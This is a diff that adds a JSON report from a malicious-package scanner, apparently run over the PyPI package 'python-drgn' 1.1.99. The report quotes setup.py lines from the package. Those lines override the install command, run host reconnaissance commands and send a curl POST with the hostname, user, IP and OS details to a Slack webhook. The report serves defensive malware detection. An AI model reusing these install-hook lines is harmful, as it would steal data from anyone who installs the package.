@@ -1,0 +1,116 @@
+{
+    "issues": 19,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "download-executable": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:49",
+                "code": "setup(name='python-drgn', version='1.1.99',description='test',author='test',license='MIT',zip_safe=False,cmdclass={'install': CustomInstall})\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "steganography": {},
+        "shady-links": [
+            {
+                "location": "setup.py:19",
+                "code": "\t\t\tpublic_ip=os.popen('curl ifconfig.me').read()\t\t\t\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:24",
+                "code": "\t\t\tpublic_ip=os.popen('curl ifconfig.me').read()\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:36",
+                "code": "                        public_ip=os.popen('curl ifconfig.me').read()\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "code-execution": [
+            {
+                "location": "setup.py:16",
+                "code": "\t\t\tconf=os.popen('uname -a').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:18",
+                "code": "\t\t\tip=os.popen('ifconfig').read()\t\t\t\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:19",
+                "code": "\t\t\tpublic_ip=os.popen('curl ifconfig.me').read()\t\t\t\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:21",
+                "code": "\t\t\tconf=os.popen('uname -a').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:23",
+                "code": "\t\t\tip=os.popen('ifconfig').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:24",
+                "code": "\t\t\tpublic_ip=os.popen('curl ifconfig.me').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:27",
+                "code": "\t\t\tconf=os.popen('systeminfo').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:29",
+                "code": "\t\t\tip=os.popen('ipconfig').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:30",
+                "code": "\t\t\tpublic_ip=os.popen('tasklist').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:33",
+                "code": "                        conf=os.popen('uname -a').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:35",
+                "code": "                        ip=os.popen('ifconfig').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:36",
+                "code": "                        public_ip=os.popen('curl ifconfig.me').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:41",
+                "code": "\t\twho=(os.popen('whoami').read())\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:43",
+                "code": "\t\thostn=(os.popen('hostname').read())\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:45",
+                "code": "\t\tos.system('curl -X POST -H \\'Content-type: application/json\\' --data \\'{\\\"text\\\": \\\"FILE_NAME: %s HOSTNAME: %s WHOAMI: %s PUBLIC_IP: %s PWD: %s OS_INFO: %s IP: %s\\\"}\\' https://hooks.slack.com/services/T2E5GPUPK/B03R6UP1HPY/pZS0vEzptS81dER...onf,ip)) \n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "obfuscation": {},
+        "exec-base64": {},
+        "dll-hijacking": {},
+        "exfiltrate-sensitive-data": {},
+        "silent-process-execution": {}
+    },
+    "path": "./dataset/pypi/python-drgn-1.1.99"
+}
